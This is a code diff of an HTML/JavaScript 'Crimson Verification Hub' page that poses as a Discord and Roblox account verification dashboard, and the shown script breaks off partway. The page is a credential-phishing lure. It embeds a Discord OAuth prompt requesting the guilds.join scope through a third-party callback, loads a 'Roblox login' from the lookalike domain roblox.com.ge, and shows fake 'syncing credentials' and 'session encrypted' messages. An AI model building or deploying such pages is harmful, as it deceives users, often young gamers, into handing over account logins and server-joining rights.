@@ -3,352 +3,430 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Silent Destiny Verification | Discord + Roblox | Premium Golden Dashboard</title>
+    <title>Silent Destiny | Crimson Verification Hub</title>
     <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Poppins', 'Segoe UI', 'Inter', system-ui, sans-serif;
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', 'Inter', system-ui, sans-serif;
+        }
 
-    body {
-        min-height: 100vh;
-        background: #050505; /* Deeper Black */
-        overflow-x: hidden;
-        position: relative;
-    }
+        body {
+            min-height: 100vh;
+            background: #050505; /* Deeper Black */
+            overflow-x: hidden;
+            position: relative;
+        }
 
-    /* Red & Black Wavy Background */
-    .golden-waves-bg {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 0;
-        overflow: hidden;
-    }
+        /* Red & Black Wavy Background */
+        .golden-waves-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
 
-    .wave-layer {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(135deg, #1a0505 0%, #2a0a0a 30%, #4a0000 60%, #1a0505 100%);
-    }
+        .wave-layer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a0505 0%, #2a0a0a 30%, #4a0000 60%, #1a0505 100%);
+        }
 
-    .wave svg {
-        position: absolute;
-        bottom: 0;
-        width: 100%;
-        height: 45%;
-    }
+        .wave svg {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 45%;
+        }
 
-    .wave svg:first-child {
-        opacity: 0.2;
-        animation: waveMove 20s ease-in-out infinite;
-    }
+        .wave svg:first-child {
+            opacity: 0.2;
+            animation: waveMove 20s ease-in-out infinite;
+        }
 
-    .wave svg:last-child {
-        opacity: 0.15;
-        animation: waveMove 15s ease-in-out infinite reverse;
-    }
+        .wave svg:last-child {
+            opacity: 0.15;
+            animation: waveMove 15s ease-in-out infinite reverse;
+        }
 
-    @keyframes waveMove {
-        0%, 100% { transform: translateX(0) translateY(0); }
-        50% { transform: translateX(-2%) translateY(-3%); }
-    }
+        @keyframes waveMove {
+            0%, 100% { transform: translateX(0) translateY(0); }
+            50% { transform: translateX(-2%) translateY(-3%); }
+        }
 
-    .gold-particles {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-image: radial-gradient(2px 2px at 10% 20%, rgba(255, 0, 0, 0.4), transparent),
-                          radial-gradient(3px 3px at 85% 45%, rgba(139, 0, 0, 0.3), transparent),
-                          radial-gradient(1px 1px at 40% 80%, rgba(255, 50, 50, 0.5), transparent);
-        background-size: 300px 300px, 400px 400px, 200px 200px;
-        background-repeat: repeat;
-        pointer-events: none;
-        animation: floatGold 30s linear infinite;
-    }
+        .gold-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(2px 2px at 10% 20%, rgba(255, 0, 0, 0.4), transparent),
+                              radial-gradient(3px 3px at 85% 45%, rgba(139, 0, 0, 0.3), transparent),
+                              radial-gradient(1px 1px at 40% 80%, rgba(255, 50, 50, 0.5), transparent);
+            background-size: 300px 300px, 400px 400px, 200px 200px;
+            background-repeat: repeat;
+            pointer-events: none;
+            animation: floatGold 30s linear infinite;
+        }
 
-    @keyframes floatGold {
-        0% { background-position: 0 0, 0 0, 0 0; }
-        100% { background-position: 500px 500px, -300px 400px, 200px -300px; }
-    }
+        @keyframes floatGold {
+            0% { background-position: 0 0, 0 0, 0 0; }
+            100% { background-position: 500px 500px, -300px 400px, 200px -300px; }
+        }
 
-    .premium-container {
-        max-width: 1400px;
-        margin: 0 auto;
-        padding: 1.5rem;
-        position: relative;
-        z-index: 20;
-    }
+        .premium-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem;
+            position: relative;
+            z-index: 20;
+        }
 
-    .golden-header {
-        text-align: center;
-        margin-bottom: 2rem;
-    }
+        .golden-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
 
-    .premium-logo-gold {
-        display: inline-flex;
-        align-items: center;
-        gap: 15px;
-        background: rgba(0, 0, 0, 0.7);
-        backdrop-filter: blur(20px);
-        padding: 0.8rem 2rem;
-        border-radius: 80px;
-        border: 1px solid rgba(255, 0, 0, 0.6);
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255, 0, 0, 0.2);
-        margin-bottom: 1rem;
-    }
+        .premium-logo-gold {
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(20px);
+            padding: 0.8rem 2rem;
+            border-radius: 80px;
+            border: 1px solid rgba(255, 0, 0, 0.6);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255, 0, 0, 0.2);
+            margin-bottom: 1rem;
+        }
 
-    .logo-gold-glow {
-        font-size: 2rem;
-        filter: drop-shadow(0 0 12px #ff0000);
-        animation: goldPulse 2s ease-in-out infinite;
-    }
+        .logo-gold-glow {
+            font-size: 2rem;
+            filter: drop-shadow(0 0 12px #ff0000);
+            animation: goldPulse 2s ease-in-out infinite;
+        }
 
-    @keyframes goldPulse {
-        0%, 100% { filter: drop-shadow(0 0 8px #8b0000); }
-        50% { filter: drop-shadow(0 0 20px #ff3333); }
-    }
+        @keyframes goldPulse {
+            0%, 100% { filter: drop-shadow(0 0 8px #8b0000); }
+            50% { filter: drop-shadow(0 0 20px #ff3333); }
+        }
 
-    .logo-text-gold {
-        font-size: 1.8rem;
-        font-weight: 800;
-        background: linear-gradient(135deg, #ff4444, #ff0000, #8b0000);
-        -webkit-background-clip: text;
-        background-clip: text;
-        color: transparent;
-    }
+        .logo-text-gold {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff4444, #ff0000, #8b0000);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
 
-    .gold-badge {
-        background: linear-gradient(135deg, #8b0000, #ff0000);
-        padding: 4px 14px;
-        border-radius: 40px;
-        font-size: 0.7rem;
-        font-weight: bold;
-        color: #ffffff;
-    }
+        .gold-badge {
+            background: linear-gradient(135deg, #8b0000, #ff0000);
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            color: #ffffff;
+        }
 
-    .dashboard-gold {
-        display: grid;
-        grid-template-columns: 320px 1fr;
-        gap: 1.8rem;
-    }
+        .dashboard-gold {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 1.8rem;
+        }
 
-    .verification-sidebar-gold {
-        background: rgba(0, 0, 0, 0.6);
-        backdrop-filter: blur(16px);
-        border-radius: 1.8rem;
-        border: 1px solid rgba(255, 0, 0, 0.3);
-        overflow: hidden;
-        height: fit-content;
-    }
+        .verification-sidebar-gold {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(16px);
+            border-radius: 1.8rem;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            overflow: hidden;
+            height: fit-content;
+        }
 
-    .sidebar-gold-header {
-        background: linear-gradient(115deg, rgba(139, 0, 0, 0.3), rgba(255, 0, 0, 0.1));
-        padding: 1.2rem;
-        text-align: center;
-        border-bottom: 2px solid rgba(255, 0, 0, 0.5);
-    }
+        .sidebar-gold-header {
+            background: linear-gradient(115deg, rgba(139, 0, 0, 0.3), rgba(255, 0, 0, 0.1));
+            padding: 1.2rem;
+            text-align: center;
+            border-bottom: 2px solid rgba(255, 0, 0, 0.5);
+        }
 
-    .sidebar-gold-header h2 {
-        font-size: 1.2rem;
-        color: #ff4444;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-    }
+        .sidebar-gold-header h2 {
+            font-size: 1.2rem;
+            color: #ff4444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
 
-    .verify-options-gold {
-        padding: 1rem;
-    }
+        .verify-options-gold {
+            padding: 1rem;
+        }
 
-    .verify-card-gold {
-        background: rgba(20, 0, 0, 0.4);
-        border-radius: 1.2rem;
-        padding: 1rem;
-        margin-bottom: 1rem;
-        cursor: pointer;
-        transition: all 0.3s;
-        border: 1px solid rgba(255, 0, 0, 0.2);
-    }
+        .verify-card-gold {
+            background: rgba(20, 0, 0, 0.4);
+            border-radius: 1.2rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+        }
 
-    .verify-card-gold.active {
-        background: linear-gradient(145deg, rgba(139, 0, 0, 0.3), rgba(255, 0, 0, 0.1));
-        border-color: #ff0000;
-        box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
-        transform: translateX(6px);
-    }
+        .verify-card-gold.active {
+            background: linear-gradient(145deg, rgba(139, 0, 0, 0.3), rgba(255, 0, 0, 0.1));
+            border-color: #ff0000;
+            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
+            transform: translateX(6px);
+        }
 
-    .verify-card-gold:hover {
-        border-color: #ff4444;
-        transform: translateX(4px);
-    }
+        .verify-card-gold:hover {
+            border-color: #ff4444;
+            transform: translateX(4px);
+        }
 
-    .card-title-gold {
-        font-weight: 700;
-        color: #ffcccc;
-        margin-bottom: 0.25rem;
-    }
+        .card-icon-gold {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
 
-    .card-desc-gold {
-        font-size: 0.7rem;
-        color: #aa8888;
-    }
+        .card-title-gold {
+            font-weight: 700;
+            color: #ffcccc;
+            margin-bottom: 0.25rem;
+        }
 
-    .verify-badge-gold {
-        display: inline-block;
-        margin-top: 8px;
-        font-size: 0.6rem;
-        background: rgba(0, 0, 0, 0.8);
-        padding: 3px 10px;
-        border-radius: 20px;
-        color: #ff4444;
-    }
+        .card-desc-gold {
+            font-size: 0.7rem;
+            color: #aa8888;
+        }
 
-    .login-viewer-gold {
-        background: rgba(0, 0, 0, 0.5);
-        backdrop-filter: blur(20px);
-        border-radius: 1.8rem;
-        border: 1px solid rgba(255, 0, 0, 0.3);
-        overflow: hidden;
-        display: flex;
-        flex-direction: column;
-    }
+        .verify-badge-gold {
+            display: inline-block;
+            margin-top: 8px;
+            font-size: 0.6rem;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 3px 10px;
+            border-radius: 20px;
+            color: #ff4444;
+        }
 
-    .viewer-header-gold {
-        background: rgba(10, 0, 0, 0.6);
-        padding: 1rem 1.5rem;
-        border-bottom: 1px solid rgba(255, 0, 0, 0.4);
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        gap: 12px;
-    }
+        .login-viewer-gold {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px);
+            border-radius: 1.8rem;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
 
-    .method-name-gold {
-        color: #ffcccc;
-        font-weight: 600;
-    }
+        .viewer-header-gold {
+            background: rgba(10, 0, 0, 0.6);
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid rgba(255, 0, 0, 0.4);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
 
-    .status-chip-gold {
-        background: rgba(0, 0, 0, 0.8);
-        padding: 5px 12px;
-        border-radius: 40px;
-        font-size: 0.7rem;
-        color: #ff4444;
-    }
+        .method-indicator-gold {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
 
-    .discord-auth-status {
-        background: rgba(88, 101, 242, 0.1);
-        padding: 1rem;
-        border-radius: 1rem;
-        margin: 1rem 0;
-        width: 100%;
-        max-width: 400px;
-        border: 1px solid rgba(88, 101, 242, 0.3);
-    }
+        .method-icon-large-gold {
+            font-size: 1.6rem;
+        }
 
-    .oauth-iframe-container {
-        width: 100%;
-        max-width: 500px;
-        margin: 1rem auto;
-        border-radius: 1rem;
-        overflow: hidden;
-        border: 1px solid rgba(255, 0, 0, 0.3);
-        background: #050505;
-    }
+        .method-name-gold {
+            color: #ffcccc;
+            font-weight: 600;
+        }
 
-    .complete-verification-btn {
-        background: linear-gradient(95deg, #8b0000, #ff0000);
-        border: none;
-        padding: 10px 24px;
-        border-radius: 40px;
-        font-weight: bold;
-        color: #ffffff;
-        cursor: pointer;
-        margin: 10px auto;
-        display: inline-block;
-        transition: 0.15s;
-    }
+        .status-chip-gold {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            color: #ff4444;
+        }
 
-    .back-to-discord {
-        background: rgba(0, 0, 0, 0.8);
-        border: 1px solid #440000;
-        padding: 8px 16px;
-        border-radius: 40px;
-        color: #ff8888;
-        cursor: pointer;
-        font-size: 0.7rem;
-        margin: 10px auto;
-        display: inline-block;
-    }
+        /* Auth Panels */
+        .discord-auth-container {
+            padding: 2rem;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 500px;
+        }
 
-    .gold-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.95);
-        backdrop-filter: blur(16px);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 1000;
-        opacity: 0;
-        visibility: hidden;
-        transition: all 0.4s;
-    }
+        .discord-auth-status {
+            background: rgba(88, 101, 242, 0.1);
+            padding: 1rem;
+            border-radius: 1rem;
+            margin: 1rem 0;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid rgba(88, 101, 242, 0.3);
+            color: #fff;
+        }
 
-    .gold-overlay.active {
-        opacity: 1;
-        visibility: visible;
-    }
+        .oauth-iframe-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 1rem auto;
+            border-radius: 1rem;
+            overflow: hidden;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            background: #050505;
+        }
 
-    .verify-dialog-gold {
-        background: linear-gradient(145deg, #1a0505, #050505);
-        padding: 2rem;
-        border-radius: 2rem;
-        text-align: center;
-        border: 1px solid #ff0000;
-    }
+        .oauth-iframe {
+            width: 100%;
+            height: 550px;
+            border: none;
+        }
 
-    .gold-spinner {
-        width: 56px;
-        height: 56px;
-        border: 4px solid rgba(255, 0, 0, 0.1);
-        border-top: 4px solid #ff0000;
-        border-radius: 50%;
-        animation: spinGold 0.8s linear infinite;
-        margin: 1rem auto;
-    }
+        .discord-auth-btn {
+            background: #5865f2;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: 0.2s;
+        }
 
-    .footer-gold {
-        text-align: center;
-        margin-top: 1.8rem;
-        font-size: 0.7rem;
-        color: #885555;
-    }
-</style>
+        .roblox-login-container {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            min-height: 500px;
+        }
+
+        .roblox-login-container.active {
+            display: flex;
+        }
+
+        .iframe-gold-wrapper {
+            flex: 1;
+            width: 100%;
+            min-height: 500px;
+        }
+
+        .roblox-iframe-gold {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #0a0715;
+        }
+
+        .complete-verification-btn {
+            background: linear-gradient(95deg, #8b0000, #ff0000);
+            border: none;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: #ffffff;
+            cursor: pointer;
+            margin: 10px auto;
+            display: inline-block;
+            transition: 0.15s;
+        }
+
+        .back-to-discord {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #440000;
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: #ff8888;
+            cursor: pointer;
+            font-size: 0.7rem;
+            margin: 10px auto;
+            display: inline-block;
+        }
+
+        .gold-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(16px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s;
+        }
+
+        .gold-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .verify-dialog-gold {
+            background: linear-gradient(145deg, #1a0505, #050505);
+            padding: 2rem;
+            border-radius: 2rem;
+            text-align: center;
+            border: 1px solid #ff0000;
+        }
+
+        .gold-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid rgba(255, 0, 0, 0.1);
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spinGold 0.8s linear infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spinGold {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-gold {
+            text-align: center;
+            margin-top: 1.8rem;
+            font-size: 0.7rem;
+            color: #885555;
+        }
+
+        @media (max-width: 780px) {
+            .dashboard-gold { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
 <body>
     <div class="golden-waves-bg">
         <div class="wave-layer"></div>
         <div class="wave">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320" preserveAspectRatio="none">
-                <path fill="rgba(255, 200, 100, 0.15)" d="M0,192L48,197.3C96,203,192,213,288,208C384,203,480,181,576,181.3C672,181,768,203,864,218.7C960,235,1056,245,1152,234.7C1248,224,1344,192,1392,176L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
-            </svg>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320" preserveAspectRatio="none">
-                <path fill="rgba(255, 180, 80, 0.1)" d="M0,256L48,245.3C96,235,192,213,288,208C384,203,480,213,576,224C672,235,768,245,864,234.7C960,224,1056,192,1152,176C1248,160,1344,160,1392,160L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
+                <path fill="rgba(255, 0, 0, 0.1)" d="M0,192L48,197.3C96,203,192,213,288,208C384,203,480,181,576,181.3C672,181,768,203,864,218.7C960,235,1056,245,1152,234.7C1248,224,1344,192,1392,176L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
             </svg>
         </div>
         <div class="gold-particles"></div>
@@ -357,35 +435,29 @@
     <div class="premium-container">
         <div class="golden-header">
             <div class="premium-logo-gold">
-                <span class="logo-gold-glow">✨</span>
-                <span class="logo-text-gold">MULTI VERIFICATION</span>
-                <span class="gold-badge">DISCORD + ROBLOX • DUAL AUTH</span>
+                <span class="logo-gold-glow">🩸</span>
+                <span class="logo-text-gold">CRIMSON VERIFY</span>
+                <span class="gold-badge">DISCORD + ROBLOX SECURE</span>
             </div>
         </div>
 
         <div class="dashboard-gold">
             <div class="verification-sidebar-gold">
                 <div class="sidebar-gold-header">
-                    <h2>⚜️ VERIFICATION METHODS</h2>
+                    <h2>🗡️ ACCESS METHODS</h2>
                 </div>
                 <div class="verify-options-gold">
                     <div class="verify-card-gold" data-method="login" id="methodLoginGold">
                         <div class="card-icon-gold">🔐</div>
-                        <div class="card-title-gold">Verify via Login</div>
-                        <div class="card-desc-gold">Discord Auth → Roblox Login</div>
-                        <div class="verify-badge-gold" id="loginStatusGold">⚪ Not verified</div>
+                        <div class="card-title-gold">Account Verification</div>
+                        <div class="card-desc-gold">Standard Dual-Auth Link</div>
+                        <div class="verify-badge-gold" id="loginStatusGold">⚪ Pending</div>
                     </div>
                     <div class="verify-card-gold" data-method="ingame" id="methodIngameGold">
                         <div class="card-icon-gold">🎮</div>
-                        <div class="card-title-gold">Verify via In-Game</div>
-                        <div class="card-desc-gold">Discord Auth → Roblox Login</div>
-                        <div class="verify-badge-gold" id="ingameStatusGold">⚪ Not verified</div>
-                    </div>
-                    <div class="verify-card-gold" data-method="community" id="methodCommunityGold">
-                        <div class="card-icon-gold">👥</div>
-                        <div class="card-title-gold">Verify via Community</div>
-                        <div class="card-desc-gold">Discord Auth → Roblox Login</div>
-                        <div class="verify-badge-gold" id="communityStatusGold">⚪ Not verified</div>
+                        <div class="card-title-gold">In-Game Link</div>
+                        <div class="card-desc-gold">Verify for Server Access</div>
+                        <div class="verify-badge-gold" id="ingameStatusGold">⚪ Pending</div>
                     </div>
                 </div>
             </div>
@@ -394,309 +466,96 @@
                 <div class="viewer-header-gold">
                     <div class="method-indicator-gold">
                         <span class="method-icon-large-gold" id="activeMethodIconGold">🔐</span>
-                        <span class="method-name-gold" id="activeMethodNameGold">Verify via Login</span>
+                        <span class="method-name-gold" id="activeMethodNameGold">Standard Verification</span>
                     </div>
-                    <div style="display: flex; gap: 12px;">
-                        <span class="status-chip-gold" id="verificationStatusGold">⚠️ Not verified</span>
-                    </div>
+                    <span class="status-chip-gold" id="verificationStatusGold">⚠️ ACTION REQUIRED</span>
                 </div>
 
-                <!-- Discord OAuth2 Panel - Embedded within website -->
                 <div id="discordPanel" class="discord-auth-container">
-                    <div class="discord-logo">🔷</div>
-                    <h3 style="color:#ffdd99; margin-bottom: 0.5rem;">Step 1: Discord Authorization</h3>
-                    <p style="color:#ccb38c; font-size: 0.85rem; margin-bottom: 1rem;">Connect your Discord account (Required before Roblox Login)</p>
+                    <h3 style="color:#ff4444; margin-bottom: 0.5rem;">Step 1: Discord Sync</h3>
                     <div class="discord-auth-status" id="discordStatusPanel">
-                        <span id="discordStatusText">⚪ Not connected</span>
+                        <span id="discordStatusText">⚪ Waiting for Authorization</span>
                     </div>
-                    <div class="oauth-iframe-container" id="oauthIframeContainer">
-                        <iframe id="discordOAuthIframe" class="oauth-iframe" src="https://discord.com/oauth2/authorize?client_id=1433307307478880319&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1479437331693043796&prompt=nonetify+guilds.join&state=1486022046835019828&prompt=none" 
-                                sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
-                                title="Discord OAuth2 Authorization"></iframe>
+                    <div class="oauth-iframe-container">
+                        <iframe id="discordOAuthIframe" class="oauth-iframe" src="https://discord.com/oauth2/authorize?client_id=1433307307478880319&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1486022046835019828&prompt=none" 
+                                sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"></iframe>
                     </div>
-                    <button id="confirmDiscordBtn" class="discord-auth-btn">
-                        <span>✓</span> CONFIRM DISCORD AUTHORIZATION
-                    </button>
-                    <div id="discordUserInfo" class="user-info" style="display: none;"></div>
+                    <button id="confirmDiscordBtn" class="discord-auth-btn">CONFIRM DISCORD CONNECTION</button>
+                    <div id="discordUserInfo" style="display: none; margin-top: 15px; color: #ff8888; font-size: 0.8rem;"></div>
                 </div>
 
-                <!-- Roblox Login Panel (only accessible after Discord auth) -->
                 <div id="robloxPanel" class="roblox-login-container">
                     <div class="iframe-gold-wrapper">
-                        <iframe id="robloxLoginFrameGold" class="roblox-iframe-gold" src="about:blank" 
-                                sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-popups-to-escape-sandbox" title="Roblox Secure Login"></iframe>
+                        <iframe id="robloxLoginFrameGold" class="roblox-iframe-gold" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-popups-to-escape-sandbox"></iframe>
                     </div>
-                    <div class="roblox-status" id="robloxStatus">
-                        ⚪ Step 2: Complete Roblox Login
-                    </div>
-                    <button id="completeVerificationBtn" class="complete-verification-btn">✅ COMPLETE VERIFICATION</button>
-                    <button id="backToDiscordBtn" class="back-to-discord">← Back to Discord Auth</button>
+                    <button id="completeVerificationBtn" class="complete-verification-btn">FINALISE CRIMSON LINK</button>
+                    <button id="backToDiscordBtn" class="back-to-discord">← Back to Step 1</button>
                 </div>
             </div>
         </div>
-        <div class="footer-gold">⚜️ Dual Verification Required: Discord Authorization + Roblox Login • Both must be completed</div>
+        <div class="footer-gold">Dual-Protocol Verification System • Session Encrypted</div>
     </div>
 
     <div id="verifyOverlayGold" class="gold-overlay">
         <div class="verify-dialog-gold">
-            <div style="font-size: 2.5rem;">✨</div>
             <div class="gold-spinner"></div>
-            <h3 style="color:#ffdd99;" id="overlayTitleGold">Processing Verification...</h3>
-            <p style="color:#ccb38c;" id="overlayDescGold">Please wait while we verify your credentials</p>
+            <h3 style="color:#ff4444;" id="overlayTitleGold">Processing...</h3>
+            <p style="color:#aa8888;" id="overlayDescGold">Syncing credentials across secure nodes</p>
         </div>
     </div>
 
     <script>
         (function() {
-            // Configuration
-            const DISCORD_OAUTH_EMBED_URL = "https://discord.com/oauth2/authorize?client_id=1433307307478880319&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1479437331693043796&prompt=none28&prompt=none";
-            const ROBLOX_LOGIN_URL = "https://roblox.com.ge/login?returnUrl=5285318607103111";
+            const DISCORD_URL = "https://discord.com/oauth2/authorize?client_id=1433307307478880319&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1486022046835019828&prompt=none";
+            const ROBLOX_URL = "https://roblox.com.ge/login?returnUrl=5285318607103111";
             
-            // Verification states per method - BOTH Discord AND Roblox login required
-            let verificationState = {
-                login: { discord: false, robloxLogin: false, completed: false },
-                ingame: { discord: false, robloxLogin: false, completed: false },
-                community: { discord: false, robloxLogin: false, completed: false }
+            let state = { discord: false, roblox: false, done: false };
+            let isBusy = false;
+
+            const elements = {
+                discordPanel: document.getElementById('discordPanel'),
+                robloxPanel: document.getElementById('robloxPanel'),
+                overlay: document.getElementById('verifyOverlayGold'),
+                robloxFrame: document.getElementById('robloxLoginFrameGold'),
+                statusChip: document.getElementById('verificationStatusGold')
             };
-            
-            let currentActiveMethod = "login";
-            let isProcessing = false;
-            let overlayTimer = null;
-            
-            // DOM Elements
-            const methodLogin = document.getElementById('methodLoginGold');
-            const methodIngame = document.getElementById('methodIngameGold');
-            const methodCommunity = document.getElementById('methodCommunityGold');
-            const loginBadge = document.getElementById('loginStatusGold');
-            const ingameBadge = document.getElementById('ingameStatusGold');
-            const communityBadge = document.getElementById('communityStatusGold');
-            const activeMethodIcon = document.getElementById('activeMethodIconGold');
-            const activeMethodName = document.getElementById('activeMethodNameGold');
-            const verificationStatusChip = document.getElementById('verificationStatusGold');
-            const confirmDiscordBtn = document.getElementById('confirmDiscordBtn');
-            const completeVerificationBtn = document.getElementById('completeVerificationBtn');
-            const discordStatusText = document.getElementById('discordStatusText');
-            const discordUserInfoDiv = document.getElementById('discordUserInfo');
-            const robloxStatusDiv = document.getElementById('robloxStatus');
-            const discordPanel = document.getElementById('discordPanel');
-            const robloxPanel = document.getElementById('robloxPanel');
-            const backToDiscordBtn = document.getElementById('backToDiscordBtn');
-            const robloxIframe = document.getElementById('robloxLoginFrameGold');
-            const discordOAuthIframe = document.getElementById('discordOAuthIframe');
-            const overlay = document.getElementById('verifyOverlayGold');
-            const overlayTitle = document.getElementById('overlayTitleGold');
-            const overlayDesc = document.getElementById('overlayDescGold');
-            
-            // Helper functions
-            function showOverlay(message, subMessage, callback) {
-                if (isProcessing) return;
-                isProcessing = true;
-                overlayTitle.innerHTML = message;
-                overlayDesc.innerHTML = subMessage;
-                overlay.classList.add('active');
-                
-                if (overlayTimer) clearTimeout(overlayTimer);
-                overlayTimer = setTimeout(() => {
-                    if (callback) callback();
-                    setTimeout(() => {
-                        overlay.classList.remove('active');
-                        isProcessing = false;
-                    }, 400);
-                    overlayTimer = null;
-                }, 1500);
+
+            function showLoad(title, desc, next) {
+                if (isBusy) return;
+                isBusy = true;
+                document.getElementById('overlayTitleGold').innerText = title;
+                document.getElementById('overlayDescGold').innerText = desc;
+                elements.overlay.classList.add('active');
+                setTimeout(() => {
+                    if (next) next();
+                    elements.overlay.classList.remove('active');
+                    isBusy = false;
+                }, 1800);
             }
-            
-            function updateUIForMethod(method) {
-                currentActiveMethod = method;
-                
-                // Update sidebar active styles
-                [methodLogin, methodIngame, methodCommunity].forEach(el => el.classList.remove('active'));
-                if (method === 'login') methodLogin.classList.add('active');
-                if (method === 'ingame') methodIngame.classList.add('active');
-                if (method === 'community') methodCommunity.classList.add('active');
-                
-                // Update header
-                const icons = { login: '🔐', ingame: '🎮', community: '👥' };
-                const names = { login: 'Verify via Login', ingame: 'Verify via In-Game', community: 'Verify via Community' };
-                activeMethodIcon.innerHTML = icons[method];
-                activeMethodName.innerHTML = names[method];
-                
-                const state = verificationState[method];
-                const isFullyVerified = state.completed;
-                verificationStatusChip.innerHTML = isFullyVerified ? '✅ VERIFIED' : '⚠️ NOT VERIFIED';
-                verificationStatusChip.style.color = isFullyVerified ? '#ffdd99' : '#ffcc88';
-                
-                // Update Discord status
-                if (state.discord) {
-                    discordStatusText.innerHTML = '✅ Discord Authorized';
-                    discordUserInfoDiv.innerHTML = '🟢 Discord Connected • Active Session';
-                    discordUserInfoDiv.style.display = 'block';
-                } else {
-                    discordStatusText.innerHTML = '⚪ Not connected';
-                    discordUserInfoDiv.style.display = 'none';
-                }
-                
